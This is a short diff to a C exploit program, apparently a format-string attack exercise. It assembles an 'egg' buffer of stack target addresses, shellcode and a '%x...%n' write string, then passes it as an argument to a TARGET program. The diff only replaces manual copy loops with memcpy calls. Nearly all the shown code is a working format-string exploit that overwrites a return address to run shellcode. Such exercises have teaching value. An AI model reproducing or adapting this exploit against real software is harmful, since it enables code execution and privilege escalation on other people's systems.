@@ -12,27 +12,14 @@ int main(void)
   char *args[3];
   char *env[1];
   char egg[EGG_SIZE];
-  char *ptr;
-  int i, l;
-
-  memset (egg, '\x00', sizeof (egg));
-  ptr = egg;
-
   char *popStack = "%x%x%x";
   char *dummyAddrPair = "\xff\xff\xff\xff\xcc\xfd\xff\xbf\xff\xff\xff\xff\xcd\xfd\xff\xbf\xff\xff\xff\xff\xce\xfd\xff\xbf\xff\xff\xff\xff\xcf\xfd\xff\xbf";
   char *writeStr = "%x%x%x%250x%n%164x%n%259x%n%192x%n";
-  
-  l = strlen(dummyAddrPair);
-  memcpy(ptr, dummyAddrPair, l);
-  
-  for (i=0; i < strlen(shellcode); ++i){
-    ptr[i+l] = shellcode[i];
-  }
 
-  l = strlen(dummyAddrPair) + strlen(shellcode);
-  for (i=0; i < strlen(writeStr); ++i){
-    ptr[i+l] = writeStr[i];
-  }
+  memset (egg, 0, sizeof (egg));  
+  memcpy (egg, dummyAddrPair, strlen (dummyAddrPair));
+  memcpy (egg + strlen (dummyAddrPair), shellcode, strlen (shellcode));
+  memcpy (egg + strlen (dummyAddrPair) + strlen (shellcode), writeStr, strlen (writeStr));
 
   args[0] = TARGET; args[1] = egg; args[2] = NULL;
   env[0] = NULL;  
